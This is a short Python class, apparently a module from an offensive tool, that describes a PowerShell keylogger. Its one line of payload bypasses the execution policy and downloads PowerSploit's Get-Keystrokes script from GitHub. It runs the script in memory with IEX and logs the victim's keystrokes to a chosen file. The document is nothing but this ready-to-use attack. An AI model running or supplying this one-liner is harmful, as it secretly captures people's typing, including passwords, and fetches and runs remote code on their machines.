class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Using a script from powersploit to log keyboard strokes to a specifed log file path"
    function    = "Keylogger"
    liner     = "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath FILE_PATH"
